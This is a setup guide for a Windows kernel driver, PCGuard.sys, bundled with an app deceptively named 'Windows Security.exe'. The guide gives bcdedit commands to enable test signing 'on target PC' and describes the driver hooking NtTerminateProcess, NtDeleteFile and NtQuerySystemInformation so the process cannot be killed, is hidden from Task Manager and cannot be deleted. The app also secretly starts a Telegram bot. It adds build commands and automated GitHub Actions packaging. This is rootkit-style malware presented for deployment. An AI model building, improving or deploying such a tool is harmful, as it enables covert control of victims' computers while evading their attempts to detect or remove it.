# PCGuard Kernel Driver — Setup Guide

## What it does

PCGuard.sys is a Windows kernel driver (Ring-0) that:
- **Blocks process termination** — no one can kill it from Task Manager
- **Hides from process list** — disappears from Task Manager completely  
- **Blocks file deletion** — exe cannot be deleted without password
- **Hooks NT syscalls** — NtTerminateProcess, NtDeleteFile, NtQuerySystemInformation

## One-time setup (run once on target PC)

### Step 1 — Enable Test Signing Mode
Open CMD as Administrator and run:
```cmd
bcdedit /set testsigning on
shutdown /r /t 0
```
PC will reboot. A small watermark appears on desktop — this is normal.

### Step 2 — Run Windows Security.exe as Administrator
Right-click → Run as administrator.

The app will:
1. Auto-extract `PCGuard.sys` to `C:\Windows\System32\drivers\`
2. Register it as a Windows service
3. Start the driver
4. Tell driver which PID to protect
5. Hide and start Telegram bot

## How protection works

```
User tries to kill "Windows Security" in Task Manager
              ↓
Task Manager calls NtTerminateProcess (syscall)
              ↓
PCGuard.sys intercepts the call in kernel (Ring-0)
              ↓
Checks if target PID == protected PID
              ↓
Returns STATUS_ACCESS_DENIED
              ↓
Task Manager shows "Access Denied" — process lives
```

## Uninstall (requires DECDRV password)

```cmd
"Windows Security.exe" --uninstall DECDRV
```

This:
1. Sends IOCTL to driver to remove hooks
2. Stops and deletes the driver service
3. Removes from System32\drivers
4. Removes startup registry + task scheduler
5. Deletes install folder

## Build the driver yourself

Requirements:
- Visual Studio 2022
- Windows Driver Kit (WDK) 10.0.22621.0+

```cmd
cd driver
cl.exe /nologo /kernel /GS- /D_AMD64_ /DNTDDI_VERSION=0x0A000007 /D_WIN32_WINNT=0x0A00 ^
  /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\km" ^
  /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\shared" ^
  /c PCGuard.cpp

link.exe /DRIVER /SUBSYSTEM:NATIVE /ENTRY:DriverEntry /NODEFAULTLIB ^
  /MACHINE:X64 ^
  /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\km\x64" ^
  ntoskrnl.lib hal.lib wdm.lib wdmsec.lib ^
  /OUT:PCGuard.sys PCGuard.obj
```

## GitHub Actions builds both automatically

Push any change → GitHub builds:
- `PCGuard.sys` (kernel driver, via WDK)
- `Windows Security.exe` (Python app, via PyInstaller)

Both bundled together — exe extracts and loads the driver automatically.

## Files

```
driver/
├── PCGuard.cpp      ← Kernel driver source (C++)
├── PCGuard.h        ← Header
└── CMakeLists.txt   ← Build config

driver_loader.py     ← Python ↔ Driver communication
main_with_driver.py  ← Updated main.py (rename to main.py)
build_driver.yml     ← GitHub Actions (rename to .github/workflows/build.yml)
```
